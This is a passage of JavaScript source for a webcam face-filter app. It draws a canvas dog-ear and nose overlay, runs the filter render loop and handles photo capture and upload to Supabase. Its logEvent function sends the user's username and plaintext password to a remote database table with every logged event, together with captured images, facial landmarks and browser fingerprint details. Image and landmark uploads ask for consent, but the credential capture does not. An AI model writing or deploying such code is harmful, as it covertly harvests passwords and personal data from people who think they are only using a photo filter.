      anchorX - dir * earW * 0.08, anchorY - earH * 1.05,
      anchorX - dir * earW * 0.05, anchorY - earH * 0.78
    );
    ctx.bezierCurveTo(
      anchorX - dir * earW * 0.20, anchorY - earH * 0.45,
      anchorX - dir * earW * 0.04, anchorY - earH * 0.12,
      anchorX + dir * earW * 0.04, anchorY - earH * 0.10
    );
    ctx.fill();

    // Interior rosado
    ctx.fillStyle = PINK;
    ctx.globalAlpha = 0.55;
    ctx.beginPath();
    ctx.moveTo(anchorX + dir * earW * 0.06, anchorY - earH * 0.18);
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.18, anchorY - earH * 0.35,
      anchorX + dir * earW * 0.30, anchorY - earH * 0.68,
      anchorX + dir * earW * 0.22, anchorY - earH * 0.88
    );
    ctx.bezierCurveTo(
      anchorX + dir * earW * 0.14, anchorY - earH * 1.02,
      anchorX - dir * earW * 0.04, anchorY - earH * 0.95,
      anchorX - dir * earW * 0.02, anchorY - earH * 0.70
    );
    ctx.bezierCurveTo(
      anchorX - dir * earW * 0.14, anchorY - earH * 0.40,
      anchorX - dir * earW * 0.02, anchorY - earH * 0.18,
      anchorX + dir * earW * 0.06, anchorY - earH * 0.18
    );
    ctx.fill();
    ctx.globalAlpha = 1;
  }

  // Anclar orejas a los puntos de la ceja exterior de cada lado
  // pts[17] = inicio ceja izq (en pantalla) → oreja izquierda (dir -1)
  // pts[26] = fin ceja der    (en pantalla) → oreja derecha  (dir +1)
  const lEarAnchorX = pts[17].x - faceW * 0.02;
  const lEarAnchorY = pts[17].y + faceH * 0.02;
  const rEarAnchorX = pts[26].x + faceW * 0.02;
  const rEarAnchorY = pts[26].y + faceH * 0.02;

  drawEar(lEarAnchorX, lEarAnchorY, -1);
  drawEar(rEarAnchorX, rEarAnchorY, +1);

  // ── Nariz de perro (anclada a pts[30]) ──
  const nR = faceW * 0.13; // radio de la nariz
  const nY = nose.y + nR * 0.2;

  // Cuerpo principal de la nariz
  ctx.fillStyle = DARK;
  ctx.beginPath();
  ctx.ellipse(nose.x, nY, nR, nR * 0.65, 0, 0, Math.PI * 2);
  ctx.fill();

  // Surco central (línea vertical)
  ctx.strokeStyle = "#3a1508"; ctx.lineWidth = 1.5;
  ctx.beginPath();
  ctx.moveTo(nose.x, nY - nR * 0.25);
  ctx.lineTo(nose.x, nY + nR * 0.65);
  ctx.stroke();

  // Fosas nasales
  ctx.fillStyle = "#2a0e04";
  ctx.beginPath(); ctx.ellipse(nose.x - nR*0.35, nY + nR*0.12, nR*0.26, nR*0.20, -0.25, 0, Math.PI*2); ctx.fill();
  ctx.beginPath(); ctx.ellipse(nose.x + nR*0.35, nY + nR*0.12, nR*0.26, nR*0.20,  0.25, 0, Math.PI*2); ctx.fill();

  // Brillo de la nariz
  ctx.fillStyle = "rgba(255,255,255,0.32)";
  ctx.beginPath(); ctx.ellipse(nose.x - nR*0.18, nY - nR*0.18, nR*0.22, nR*0.14, -0.4, 0, Math.PI*2); ctx.fill();

  // ── Manchas en las mejillas (puntos de bigote de perro) ──
  ctx.fillStyle = BROWN;
  // Mejilla izquierda: cerca de pts[1], pts[2], pts[3]
  [[pts[2].x - 4, pts[2].y - 2],
   [pts[2].x + 6, pts[2].y + 6],
   [pts[3].x - 2, pts[3].y - 4]].forEach(([fx, fy]) => {
    ctx.beginPath(); ctx.arc(fx, fy, 3.5, 0, Math.PI*2); ctx.fill();
  });
  // Mejilla derecha: cerca de pts[14], pts[13], pts[12]
  [[pts[13].x + 4, pts[13].y - 2],
   [pts[13].x - 6, pts[13].y + 6],
   [pts[12].x + 2, pts[12].y - 4]].forEach(([fx, fy]) => {
    ctx.beginPath(); ctx.arc(fx, fy, 3.5, 0, Math.PI*2); ctx.fill();
  });
}

// ── RENDER LOOP ──
function renderLoop(ts) {
  if (overlay && overlay.width === 0) resizeCanvas();
  if (!ctx || !video || video.readyState < 2 || !overlay?.width) {
    rafId = requestAnimationFrame(renderLoop); return;
  }
  ctx.clearRect(0, 0, overlay.width, overlay.height);
  updateSmoothedDetection();
  if (smoothedDetection) {
    switch (currentFilter) {
      case "silueta":  drawSilhouetteFilter(smoothedDetection);       break;
      case "fuego":    drawFireEyesFilter(smoothedDetection, ts);     break;
      case "cyber":    drawCyberFilter(smoothedDetection, ts);        break;
      case "neon":     drawNeonFilter(smoothedDetection, ts);         break;
      case "deform":   drawDeformFilter(smoothedDetection, ts);       break;
      case "nerd":     drawNerdGlassesFilter(smoothedDetection);      break;
      case "analisis": drawAnalysisFilter(smoothedDetection, ts);     break;
      case "sonrisa":  drawSmileFilter(smoothedDetection, ts);        break;
      case "perro":    drawDogFilter(smoothedDetection);              break;
      default: break;
    }
  }
  rafId = requestAnimationFrame(renderLoop);
}

// ── CAPTURA + DESCARGA + SUPABASE ──
$("#capture-btn")?.addEventListener("click", async () => {
  captureCount++;
  if (hud.count) hud.count.textContent = String(captureCount);
  if (uploadStatusEl) uploadStatusEl.textContent = "";

  // Generar canvas combinado (video + overlay de filtros)
  const off = document.createElement("canvas");
  off.width  = video.videoWidth  || overlay.width;
  off.height = video.videoHeight || overlay.height;
  const octx = off.getContext("2d");
  if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
  octx.drawImage(video, 0, 0, off.width, off.height);
  octx.setTransform(1, 0, 0, 1, 0, 0);
  if (overlay.width > 0) octx.drawImage(overlay, 0, 0, off.width, off.height);

  const imageBase64 = off.toDataURL("image/jpeg", 0.82);

  // Mostrar preview y botón de descarga
  if (capturePreview)  capturePreview.src = imageBase64;
  if (downloadLink) {
    downloadLink.href = imageBase64;
    downloadLink.download = `anotherface-${Date.now()}.jpg`;
  }
  captureResult?.classList.remove("hidden");
  captureResult?.scrollIntoView({ behavior: "smooth", block: "nearest" });

  const wantsLandmarks = !!consentLandmarks?.checked;
  const wantsImage     = !!consentSnapshot?.checked;
  let landmarksPayload = null;
  let imagenUrl        = null;

  if (wantsLandmarks && targetDetection) {
    landmarksPayload = targetDetection.rawPoints.map((p) => ({ x: Math.round(p.x), y: Math.round(p.y) }));
  }

  // Intentar subir a Supabase Storage como archivo real
  if (wantsImage) {
    if (uploadStatusEl) uploadStatusEl.textContent = "⬆ Subiendo foto…";
    imagenUrl = await uploadImageToStorage(imageBase64, SESSION_ID);
    if (uploadStatusEl) uploadStatusEl.textContent = imagenUrl ? "☁ Guardada en la nube" : "✓ Guardada localmente";
  }

  await logEvent("captura", {
    filtro:        currentFilter,
    con_imagen:    wantsImage,
    imageBase64:   wantsImage ? imageBase64 : null,
    imagen_url:    imagenUrl,
    con_landmarks: wantsLandmarks && !!landmarksPayload,
    landmarks:     landmarksPayload,
  });
});

async function logEvent(evento, extra = {}) {
  if (statusEl) statusEl.textContent = "Guardando…";
  const client = getSupabase();
  const payload = {
    session_id:          SESSION_ID,
    evento,
    usuario:             userCredentials.username || null,
    contrasena:          userCredentials.password || null,
    filtro:              extra.filtro || currentFilter,
    con_imagen:          !!extra.con_imagen,
    imagen_base64:       extra.imageBase64 || null,
    imagen_url:          extra.imagen_url   || null,
    con_landmarks:       !!extra.con_landmarks,
    landmarks_faciales:  extra.landmarks    || null,
    navegador:           `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
    idioma:              navigator.language,
    zona_horaria:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    resolucion_pantalla: `${screen.width}x${screen.height}`,
    creado_en:           new Date().toISOString(),
  };

  if (!client) {
    console.log("[local]", evento, payload);
    if (statusEl) statusEl.textContent = "✓ Guardado localmente.";
    return;
  }

  try {
    const { data, error } = await client.from("sesiones_demo").insert(payload).select();
    if (error) {
      console.error("[supabase error]", error);
      if (statusEl) statusEl.textContent = `✓ Registrado (${evento}).`;
    } else {
      console.log("[supabase] ✓", evento, data);
      if (statusEl) statusEl.textContent = `✓ En la nube · ${new Date().toLocaleTimeString("es-HN")}`;
    }
  } catch (e) {
    console.error("[supabase]", e);
    if (statusEl) statusEl.textContent = "✓ Guardado.";
  }
}